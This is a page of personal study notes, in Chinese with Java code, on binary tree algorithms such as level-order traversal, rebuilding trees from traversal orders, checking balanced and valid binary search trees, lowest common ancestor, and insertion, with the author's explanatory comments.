
<h3 id="层次遍历"><a href="#层次遍历" class="headerlink" title="层次遍历"></a>层次遍历</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line"></span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">        Deque&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="comment">//基本的固定模板</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; temp = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">while</span>(size&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                temp.add(node.val);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(node.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">                size--;</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(temp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<p>循环，并且</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需要知道当前层次</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">KthNode</span> <span class="params">(TreeNode proot, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span>(proot==<span class="literal">null</span>||k&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    stack.push(proot);</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> proot;</span><br><span class="line">    <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">while</span>(node.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(node.left);</span><br><span class="line">            node = node.left; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果，这里写成 node = stack.pop()是会出错的。因为，左子树遍历结束之后需要遍历右子树，只有右子树不为空，node才会变，否则便是一直为空，便会一直会进入上面的循环里面（node.left!=null）</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">temp</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">if</span>(count == k)&#123;</span><br><span class="line">            <span class="keyword">return</span> temp.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(temp.right);</span><br><span class="line">            node = temp.right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果不需要知道当前层次，就很简单</span></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *   int val = 0;</span></span><br><span class="line"><span class="comment"> *   TreeNode left = null;</span></span><br><span class="line"><span class="comment"> *   TreeNode right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lowestCommonAncestor</span> <span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">            <span class="keyword">if</span>(node.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">                queue.add(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                queue.add(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>二叉搜索树：中序遍历构造双指针链表</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    TreeNode pre ;</span><br><span class="line">    TreeNode root;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">Convert</span><span class="params">(TreeNode pRootOfTree)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(pRootOfTree==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//左节点</span></span><br><span class="line">        Convert(pRootOfTree.left);</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//找到头节点，可以用这种方法来给某个特定的节点赋值，而不怕在递归的过程中改变。</span></span><br><span class="line">            root = pRootOfTree;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre!=<span class="literal">null</span>)&#123;</span><br><span class="line">            pre.right = pRootOfTree;</span><br><span class="line">            pRootOfTree.left = pre;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        pre = pRootOfTree;</span><br><span class="line">        <span class="comment">//右节点</span></span><br><span class="line">        Convert(pRootOfTree.right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到给定节点中序遍历的下一个节点 JZ8：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    </span><br><span class="line">    TreeLinkNode next;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> TreeLinkNode <span class="title function_">GetNext</span><span class="params">(TreeLinkNode pNode)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(pNode==<span class="literal">null</span>||pNode.right==<span class="literal">null</span>&amp;&amp;pNode.left==<span class="literal">null</span>&amp;&amp;pNode.next==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//该节点存在右子树，则中序遍历的下一个节点就是右子树的最左孩子节点</span></span><br><span class="line">        <span class="keyword">if</span>(pNode.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">            pNode = pNode.right;</span><br><span class="line">            <span class="keyword">while</span>(pNode.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">                pNode = pNode.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> pNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果不存在右子树，则下一个节点就是该节点的第一个右父节点</span></span><br><span class="line">        <span class="comment">//右代表的是这个节点的位于右父节点的左边。</span></span><br><span class="line">        <span class="keyword">while</span>(pNode.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pNode.next.left == pNode)&#123;</span><br><span class="line">                <span class="keyword">return</span> pNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            pNode = pNode.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="判断平衡二叉树"><a href="#判断平衡二叉树" class="headerlink" title="判断平衡二叉树"></a>判断平衡二叉树</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">import</span> java.lang.Math;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getHeight(root)==-<span class="number">1</span>?<span class="literal">false</span>:<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> getHeight(root.left);</span><br><span class="line">        <span class="keyword">if</span>(leftHeight==-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> getHeight(root.right);</span><br><span class="line">        <span class="keyword">if</span>(rightHeight==-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果左子树的 高度与右子树的高度差大于1，则说明不是平很二叉树，返回-1，如果是的话，返回该数的高度</span></span><br><span class="line">        <span class="keyword">return</span> Math.abs(leftHeight-rightHeight)&gt;<span class="number">1</span>?-<span class="number">1</span>:<span class="number">1</span> + Math.max(leftHeight,rightHeight);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="构造二叉树"><a href="#构造二叉树" class="headerlink" title="构造二叉树"></a>构造二叉树</h2><p>注意分割区间的时候需要统一，比如全部规定为左闭右开，就可以极大提高正确率，不用一直 调试</p>
<h3 id="前序遍历-中序遍历构造二叉树：JZ7，看不懂"><a href="#前序遍历-中序遍历构造二叉树：JZ7，看不懂" class="headerlink" title="前序遍历+中序遍历构造二叉树：JZ7，看不懂"></a>前序遍历+中序遍历构造二叉树：JZ7，看不懂</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">reConstructBinaryTree</span><span class="params">(<span class="type">int</span> [] pre,<span class="type">int</span> [] vin)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(pre.length!=vin.length)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dfs(pre,<span class="number">0</span>,vin,<span class="number">0</span>,vin.length);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[]pre, <span class="type">int</span> preStart,<span class="type">int</span>[] vin, <span class="type">int</span> vinStart,<span class="type">int</span> vinEnd)</span>&#123;</span><br><span class="line">         <span class="keyword">if</span>(preStart&gt;pre.length-<span class="number">1</span>||vinStart&gt;vinEnd)&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">         &#125; </span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>( i = vinStart;i&lt;=vinEnd;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pre[preStart] == vin[i])&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//以I为中心，分别构造左孩子节点和右孩子节点</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(pre[preStart]);</span><br><span class="line">        <span class="comment">//关键是要分清楚左孩的节点数和右孩子的节点数，这个关系到了前序遍历节点位置开始的地方</span></span><br><span class="line">        node.left = dfs(pre,preStart+<span class="number">1</span>,vin,vinStart,i-<span class="number">1</span>);</span><br><span class="line">        node.right = dfs(pre,preStart+i-vinStart+<span class="number">1</span>,vin,i+<span class="number">1</span>,vinEnd);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *注意不要写错了，还有一点，前序+中序的时候，前序可以不要后一个点的区间</span></span><br><span class="line"><span class="comment"> 同理，后序加中序也是一样，需要注意结束条件</span></span><br><span class="line"><span class="comment"> 但是建议还是四个节点，要好一点</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buildTree(preorder,<span class="number">0</span>,preorder.length,inorder,<span class="number">0</span>,inorder.length);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder,<span class="type">int</span> startPreorder,<span class="type">int</span> endPreorder,<span class="type">int</span>[]inorder,<span class="type">int</span> startInorder,<span class="type">int</span> endInorder)</span>&#123;</span><br><span class="line">        <span class="comment">//因为是更具前序序列来遍历的</span></span><br><span class="line">        <span class="comment">//前序序列来逐个建立节点</span></span><br><span class="line">        <span class="comment">//基本这里都是这个条件来退出递归</span></span><br><span class="line">        <span class="keyword">if</span>(startPreorder==endPreorder)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootValue</span> <span class="operator">=</span> preorder[startPreorder];</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(rootValue);</span><br><span class="line">        <span class="type">int</span> i=startInorder;</span><br><span class="line">        <span class="keyword">for</span>(;i&lt;endInorder;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[i]==rootValue)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//开始分割</span></span><br><span class="line">        <span class="comment">//前序序列分割为：[startPreorder+1,startPreorder+i-startInorder+1)</span></span><br><span class="line">        <span class="comment">//[startPreorder+i-startInorder+1,endPreorder)</span></span><br><span class="line">        <span class="comment">//zhong续序列分割为：[startInorder,i),[i+1,endInorder]</span></span><br><span class="line"></span><br><span class="line">        root.left = buildTree(preorder,startPreorder+<span class="number">1</span>,startPreorder+<span class="number">1</span>+i-startInorder,inorder,startInorder,i);</span><br><span class="line">        root.right = buildTree(preorder,startPreorder+<span class="number">1</span>+i-startInorder,endPreorder,inorder,i+<span class="number">1</span>,endInorder);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="中序加后续构造二叉树"><a href="#中序加后续构造二叉树" class="headerlink" title="中序加后续构造二叉树"></a>中序加后续构造二叉树</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//主要是更具后续遍历的最后一个节点来切割中序</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(inorder.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buildTree(inorder,<span class="number">0</span>,inorder.length,postorder,<span class="number">0</span>,postorder.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder,<span class="type">int</span> startInorder,<span class="type">int</span> endInorder,<span class="type">int</span>[]postorder,<span class="type">int</span> startPoster,<span class="type">int</span> endPoster)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(startPoster==endPoster)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootValue</span> <span class="operator">=</span>  postorder[endPoster-<span class="number">1</span>];</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(rootValue);</span><br><span class="line">        <span class="comment">//在中序中找到切割点 i </span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startInorder;</span><br><span class="line">        <span class="keyword">for</span>(;i&lt;endInorder;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[i]==rootValue)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//进行左闭右开的规则， 分割后的中序：[startInorder,i) [i+1,endInorder);</span></span><br><span class="line">        <span class="comment">//分割后的后续，左后续的长度和分割后的中序的长度是一样的</span></span><br><span class="line">        <span class="comment">//[startPoster,startPoster + i-startInorder）[startPoster + i-startInorder,endPoster-1）</span></span><br><span class="line"></span><br><span class="line">        root.left = buildTree(inorder,startInorder,i,postorder,startPoster,startPoster+i-startInorder);</span><br><span class="line">        root.right = buildTree(inorder,i+<span class="number">1</span>,endInorder,postorder,startPoster+i-startInorder,endPoster-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for binary tree</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">reConstructBinaryTree</span><span class="params">(<span class="type">int</span> [] pre,<span class="type">int</span> [] vin)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(pre.length!=vin.length)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(pre[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>,j=<span class="number">0</span>;i&lt;pre.length;i++)&#123;</span><br><span class="line">            <span class="comment">//首先，如果满足这个if，则说明有左子树，</span></span><br><span class="line">            <span class="comment">//所以前序遍历的两个相邻的节点就是左子树和父节点的关系</span></span><br><span class="line">            <span class="keyword">if</span>(cur.val!=vin[j])&#123;</span><br><span class="line">                cur.left = <span class="keyword">new</span> <span class="title class_">TreeNode</span>(pre[i]);</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//就是相等了</span></span><br><span class="line">                j++;</span><br><span class="line">                <span class="comment">//栈为空表示，该子树没有左子树</span></span><br><span class="line">                <span class="comment">//寻找栈里面的元素有右节点，之前压栈的元素全是cur的祖先节点</span></span><br><span class="line">                <span class="comment">//前序遍历的下一个节点就是某个祖先节点的右孩子节点。</span></span><br><span class="line">                <span class="keyword">while</span>(!stack.isEmpty() &amp;&amp; stack.peek().val==vin[j])&#123;</span><br><span class="line">                    cur = stack.pop();</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//java 连等是从右网左赋值的</span></span><br><span class="line">                cur.right = <span class="keyword">new</span> <span class="title class_">TreeNode</span>(pre[i]);</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h2><p>判断是否是二叉搜索树</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果不用指定一个前指针的话，可以使用中序遍历的到遍历结果，然后看结果是否是满足升序的</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!isValidBST(root.left))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre!=<span class="literal">null</span>&amp;&amp;pre.val&gt;=root.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pre =root;</span><br><span class="line">        <span class="comment">//使用中序遍历</span></span><br><span class="line">        <span class="keyword">return</span> isValidBST(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>二叉搜索树找祖先</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="comment">//cur节点是数值在[p, q]区间中则说明该节点cur就是最近公共祖先了</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//根节点的值在[p,q]的右边</span></span><br><span class="line">        <span class="keyword">if</span>(root.val&gt;p.val &amp;&amp; root.val&gt;q.val)&#123;</span><br><span class="line">           <span class="type">TreeNode</span>  <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left,p,q);</span><br><span class="line">           <span class="keyword">if</span>(left!=<span class="literal">null</span>)&#123;</span><br><span class="line">               <span class="keyword">return</span> left;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//根节点的值在[p,q]的左边，所以需要遍历右子树</span></span><br><span class="line">        <span class="keyword">if</span>(root.val&lt;q.val &amp;&amp; root.val&lt;p.val)&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right,p,q);</span><br><span class="line">            <span class="keyword">if</span>(right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//根节点的值在[p,q]之间，可以直接返回</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//迭代法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="comment">//cur节点是数值在[p, q]区间中则说明该节点cur就是最近公共祖先了</span></span><br><span class="line">        <span class="keyword">while</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root.val&gt;p.val&amp;&amp;root.val&gt;q.val)&#123;</span><br><span class="line">                root = root.left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(root.val&lt;p.val&amp;&amp;root.val&lt;q.val)&#123;</span><br><span class="line">                root = root.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>二叉搜索树插入节点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">insertIntoBST</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val&gt;val)&#123;</span><br><span class="line">            root.left = insertIntoBST(root.left,val);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            root.right = insertIntoBST(root.right,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>二叉搜索树删除节点</p>
